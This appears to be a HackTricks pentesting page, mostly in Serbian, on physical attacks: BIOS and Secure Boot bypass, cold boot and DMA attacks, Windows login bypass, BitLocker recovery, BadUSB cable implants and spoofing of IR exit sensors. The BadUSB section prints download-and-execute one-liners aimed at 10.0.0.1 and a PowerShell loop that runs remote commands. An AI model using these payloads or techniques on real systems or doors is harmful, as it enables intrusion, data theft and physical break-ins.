# Fizički napadi

{{#include ../banners/hacktricks-training.md}}

## Oporavak BIOS lozinke i bezbednost sistema

**Resetovanje BIOS-a** se može postići na nekoliko načina. Većina matičnih ploča sadrži **bateriju** koja, ako se ukloni na oko **30 minuta**, će resetovati BIOS podešavanja, uključujući i lozinku. Alternativno, **jumper na matičnoj ploči** može se podesiti da resetuje ova podešavanja tako što se povežu određeni pinovi.

Za situacije kada hardverske izmene nisu moguće ili praktične, **softverski alati** nude rešenje. Pokretanje sistema sa **Live CD/USB** distribucijama kao što je **Kali Linux** pruža pristup alatima poput **_killCmos_** i **_CmosPWD_**, koji mogu pomoći pri oporavku BIOS lozinke.

U slučajevima kada je BIOS lozinka nepoznata, unošenje pogrešne lozinke **tri puta** obično će rezultirati šifrom greške. Ova šifra se može iskoristiti na sajtovima kao što je [https://bios-pw.org](https://bios-pw.org) da bi se potencijalno dobila upotrebljiva lozinka.

### Sigurnost UEFI

Za moderne sisteme koji koriste **UEFI** umesto tradicionalnog BIOS-a, alat **chipsec** može se koristiti za analizu i izmene UEFI podešavanja, uključujući onemogućavanje **Secure Boot**. Ovo se može postići sledećom naredbom:
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## RAM Analysis and Cold Boot Attacks

RAM retains data briefly after power is cut, usually for **1 to 2 minutes**. This persistence can be extended to **10 minutes** by applying cold substances, such as liquid nitrogen. During this extended period, a **memory dump** can be created using tools like **dd.exe** and **volatility** for analysis.

---

## Direct Memory Access (DMA) Attacks

**INCEPTION** je alat dizajniran za **physical memory manipulation** preko DMA, kompatibilan sa interfejsima kao što su **FireWire** i **Thunderbolt**. Omogućava zaobilaženje login procedura patchovanjem memorije da prihvati bilo koji password. Međutim, neefikasan je protiv **Windows 10** sistema.

---

## Live CD/USB for System Access

Zamena sistemskih binarnih fajlova kao što su **_sethc.exe_** ili **_Utilman.exe_** kopijom **_cmd.exe_** može obezbediti command prompt sa sistemskim privilegijama. Alati poput **chntpw** mogu se koristiti za izmenu **SAM** fajla Windows instalacije, omogućavajući promenu password-a.

**Kon-Boot** je alat koji olakšava prijavljivanje u Windows sisteme bez poznavanja password-a privremenom izmenom Windows kernela ili UEFI. Više informacija može se naći na [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/).

---

## Handling Windows Security Features

### Boot and Recovery Shortcuts

- **Supr**: Pristup BIOS podešavanjima.
- **F8**: Ulazak u Recovery mode.
- Pritiskanje **Shift** nakon Windows banera može zaobići autologon.

### BAD USB Devices

Uređaji kao što su **Rubber Ducky** i **Teensyduino** služe kao platforme za kreiranje **bad USB** uređaja, sposobnih da izvrše unapred definisane payload-e kada su povezani na ciljnu mašinu.

### Volume Shadow Copy

Administrator privilegije omogućavaju kreiranje kopija osetljivih fajlova, uključujući **SAM** fajl, putem PowerShell-a.

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- Implanti zasnovani na ESP32-S3, poput **Evil Crow Cable Wind**, skrivaju se unutar USB-A→USB-C ili USB-C↔USB-C kablova, pojavljuju se isključivo kao USB keyboard i izlažu svoj C2 stack preko Wi-Fi. Operater treba samo napajati kabl sa žrtvinog hosta, napraviti hotspot nazvan `Evil Crow Cable Wind` sa password-om `123456789`, i otvoriti [http://cable-wind.local/](http://cable-wind.local/) (ili njegovu DHCP adresu) da bi pristupio ugrađenom HTTP interfejsu.
- Browser UI pruža kartice za *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* i *Config*. Sačuvani payload-i su tagovani po OS-u, rasporedi tastature se menjaju u hodu, a VID/PID stringovi se mogu promeniti da oponašaju poznate periferije.
- Pošto C2 živi unutar kabla, telefon može postaviti payload-e, pokrenuti izvršenje i upravljati Wi-Fi kredencijalima bez dodirivanja host OS-a — idealno za fizičke upade sa kratkim vremenom prisustva.

### OS-aware AutoExec payloads

- AutoExec pravila povezuju jedan ili više payload-a da se pokrenu odmah nakon USB enumeracije. Implant obavlja lagano OS fingerprinting i bira odgovarajući skript.
- Primer toka:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) or `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Pošto se izvršenje odvija bez nadzora, samo zamena punjačkog kabla može obezbediti “plug-and-pwn” početni pristup u kontekstu prijavljenog korisnika.

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** Smešteni payload otvara konzolu i ubacuje petlju koja izvršava sve što stigne na novi USB serial uređaj. Minimalna Windows varijanta je:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** Implant održava USB CDC kanal otvoren dok njegov ESP32-S3 pokreće TCP client (Python script, Android APK, or desktop executable) nazad ka operatoru. Bilo koji bajt unet u TCP sesiju prosleđuje se u serial loop iznad, omogućavajući udaljeno izvršavanje komandi čak i na air-gapped hostovima. Output je ograničen, pa operateri obično izvršavaju blind commands (kreiranje naloga, postavljanje dodatnih alata, itd.).

### HTTP OTA update surface

- Isti web stack obično izlaže unauthenticated firmware updates. Evil Crow Cable Wind listens on `/update` and flashes whatever binary is uploaded:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Operatori na terenu mogu hot-swap funkcije (npr. flash USB Army Knife firmware) tokom angažmana bez otvaranja kabla, što omogućava implantu da preusmeri funkcionalnost dok je i dalje priključen na ciljnu mašinu.

## Bypassing BitLocker Encryption

BitLocker enkripciju je moguće zaobići ako se **recovery password** pronađe u dump fajlu memorije (**MEMORY.DMP**). Alati poput **Elcomsoft Forensic Disk Decryptor** ili **Passware Kit Forensic** mogu se koristiti u te svrhe.

---

## Social Engineering for Recovery Key Addition

Novi BitLocker recovery key može biti dodat putem socijalnog inženjeringa, ubеdivši korisnika da izvrši komandu koja dodaje novi recovery key sastavljen od nula, čime se pojednostavljuje proces dekripcije.

---

## Exploiting Chassis Intrusion / Maintenance Switches to Factory-Reset the BIOS

Mnogi moderni laptopovi i desktop računari malog form-faktora uključuju **chassis-intrusion switch** koji nadgleda Embedded Controller (EC) i BIOS/UEFI firmware. Dok je primarna namena prekidača da podigne alarm kada se uređaj otvori, proizvođači ponekad implementiraju **undocumented recovery shortcut** koji se aktivira kada se prekidač prebacuje u određenom obrascu.

### How the Attack Works

1. Prekidač je povezan na **GPIO interrupt** na EC.
2. Firmware na EC prati **timing and number of presses**.
3. Kada se prepozna hard-codiran obrazac, EC poziva *mainboard-reset* rutinu koja **briše sadržaj sistemskog NVRAM/CMOS-a**.
4. Pri sledećem boot-u, BIOS učitava podrazumevane vrednosti – **supervisor password, Secure Boot keys, i sva prilagođena konfiguracija se brišu**.

> Kada je Secure Boot onemogućen i firmware password uklonjen, napadač može jednostavno boot-ovati bilo koju eksternu OS sliku i dobiti neograničen pristup internim diskovima.

### Real-World Example – Framework 13 Laptop

Recovery shortcut za Framework 13 (11th/12th/13th-gen) je:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Nakon desetog ciklusa EC postavlja zastavicu koja naređuje BIOS-u da obriše NVRAM pri sledećem restartu. Cela procedura traje ~40 s i zahteva **samo izvijač**.

### Generički postupak eksploatacije

1. Uključi cilj ili izvrši suspend-resume da EC bude aktivan.
2. Ukloni donji poklopac da otkriješ intrusion/maintenance switch.
3. Reproduciraj proizvođački-specifičan obrazac prebacivanja (konsultuj dokumentaciju, forume, ili reverse-engineer EC firmware).
4. Ponovo složi i restartuj – firmware zaštite bi trebalo da budu onemogućene.
5. Podigni live USB (npr. Kali Linux) i izvrši uobičajeni post-exploitation (credential dumping, data exfiltration, implanting malicious EFI binaries, etc.).

### Detekcija i ublažavanje

* Zabeleži chassis-intrusion događaje u OS management konzoli i poveži ih sa neočekivanim BIOS resetima.
* Koristi **pečate koji otkrivaju manipulaciju** na šrafovima/poklopcima da detektuješ otvaranje.
* Drži uređaje u **fizički kontrolisanim područjima**; pretpostavi da fizički pristup znači potpuni kompromis.
* Gde je dostupno, onemogući proizvođačevu funkciju “maintenance switch reset” ili zahtevaj dodatnu kriptografsku autorizaciju za NVRAM reset.

---

## Skrivena IR injekcija protiv senzora za izlaz bez dodira

### Karakteristike senzora
- Uobičajeni “wave-to-exit” senzori povezuju near-IR LED emiter sa prijemnim modulom u stilu TV daljinskog koji prijavljuje logičku jedinicu tek nakon što vidi više pulsa (~4–10) ispravnog nosioca (≈30 kHz).
- Plastični šild blokira emiter i prijemnik da gledaju direktno jedno u drugo, pa kontroler pretpostavlja da je validirani nosilac došao iz obližnje refleksije i aktivira relej koji otvara door strike.
- Kada kontroler veruje da je cilj prisutan, često menja izlazni modulacioni omotač, ali prijemnik nastavlja da prihvata bilo koji burst koji odgovara filtriranom nosiocu.

### Tok napada
1. **Snimite profil emisije** – priključite logic analyser na pinove kontrolera da zabeležite i pre-detection i post-detection talasne oblike koji pogone internu IR LED.
2. **Ponovo reprodukujte samo “post-detection” talasni oblik** – uklonite/ignorišite fabrički emiter i pokrećite eksternu IR LED sa obrascem koji je već okinut od samog početka. Pošto prijemnik vodi računa samo o broju pulsa/frekvenciji, tretira spoofed carrier kao pravu refleksiju i aktivira liniju releja.
3. **Kontrolišite prenos** – emituјte nosilac u podešenim burst-evima (npr. desetine milisekundi uključen, slično isključen) da isporučite minimalan broj pulsa bez zasićenja AGC-a prijemnika ili logike za rukovanje interferencijama. Kontinuirana emisija brzo desenzitivira senzor i zaustavlja aktiviranje releja.

### Reflektivna injekcija na velikim udaljenostima
- Zamena bench LED sa visokosnažnom IR diodom, MOSFET driver-om i fokusirajućom optikom omogućava pouzdano okidanje sa udaljenosti ~6 m.
- Napadač ne treba line-of-sight do otvora prijemnika; usmeravanje snopa na unutrašnje zidove, police ili okvire vrata koji su vidljivi kroz staklo dozvoljava reflektovanoj energiji da uđe u ~30° polje gledanja i oponaša talas ruke iz blizine.
- Pošto prijemnici očekuju samo slabe refleksije, mnogo jači eksterni snop može se odbiti od više površina i i dalje ostati iznad praga detekcije.

### Weaponised Attack Torch
- Ugradnja driver-a unutar komercijalne baterijske lampe skriva alat na vidnom mestu. Zamenite vidljivu LED visokosnažnom IR LED usklađenom sa opsegom prijemnika, dodajte ATtiny412 (ili sličan) da generiše ≈30 kHz burst-ove, i koristite MOSFET za povlačenje struje LED-a.
- Teleskopski zoom objektiv sužava snop za domet/preciznost, dok vibracioni motor pod kontrolom MCU daje haptičku potvrdu da je modulacija aktivna bez emitovanja vidljive svetlosti.
- Cikliranje kroz nekoliko sačuvanih modulacionih obrazaca (blago različite frekvencije nosioca i omotači) povećava kompatibilnost između rebrendiranih porodica senzora, dopuštajući operateru da pretražuje reflektujuće površine dok relej ne klikne i vrata se ne otvore.

---

## References

- [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)

{{#include ../banners/hacktricks-training.md}}
